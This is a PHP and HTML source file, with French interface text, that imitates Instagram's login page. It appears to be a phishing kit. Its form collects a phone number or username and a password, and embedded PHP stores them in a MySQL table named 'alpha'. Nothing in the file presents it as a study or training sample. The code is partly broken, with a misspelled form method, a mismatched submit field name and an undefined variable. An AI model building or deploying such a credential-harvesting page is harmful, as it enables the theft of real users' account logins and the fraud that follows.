<?php 

   try {
    $connection = new PDO ("mysql:host = localhost; dbname = alpha", "root", "");
    $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_WARNING);
    
   } catch(exception $e) {
        $e->getMessage();
   }


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Instagram</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="style.css">
        <link rel="icon" type="image/png" href="images/instagram.ico" />
        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&lang=en" />

    
        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
    
    </head>

    <body>
    
        <div class="main">


            <img src="https://i.ibb.co/XJXqZP4/principal-image.png" height="575" width="375" class="main-image">

            <div class="main-card-login">


                <div class="login-card">

                    <div class="login-card-header-image">
                        <img src="https://i.ibb.co/chYt9nx/instagram-header.png" height="70" width="180">
                    </div>
    
    
                    <div class="login-card-form">

                    <form action="" methode = "post">

                        <input type="text" placeholder="Numéro de téléphone, nom d'utilisateur ou..." name ="numero">
                        <input type="password" placeholder="Mot de passe" name ="mdp">
                        <input type="submit" value="se connecter" class="button" name="button">
                        
                    </form>

                    <?php

                         if(isset($_POST['bouton'])){

                            $nom = $_POST['numero'];
                            $mdp = $_POST['mdp'];

                        $req = $connection-> prepare("INSERT INTO alpha(numero, mdp) VALUES (?,?)");
                        $req ->execute(array($numero, $mdp));
                        

                       
                        
                        }
    

                    ?>
    
                        <div class="login-or">
                            <hr class="login-or-first-separation">
                            OU
                            <hr class="login-or-last-separation">
                        </div>
    
                        <div class="login-with-facebook">
    
                            <p>
                                <i class="fa fa-facebook-square" aria-hidden="true"></i> 
                                Se connecter avec Facebook
                            </p>
                            
                        </div>
                        
                        <div class="forgot-password">
    
                            <p>
    
                                Mot de passe oublié ?
    
                            </p>
    
                        </div>
    
                    </div>
    
    
    
                </div>
    
                <div class="login-card-footer">
    
                    Vous n'avez pas de compte ? 
                    <span>
                        Inscrivez-vous
                    </span>
    
    
                </div>

                <div class="download-app">

                        Téléchargez l'application.

                </div>

               

            </div>

            

            


        </div>
    
    </body>



</html>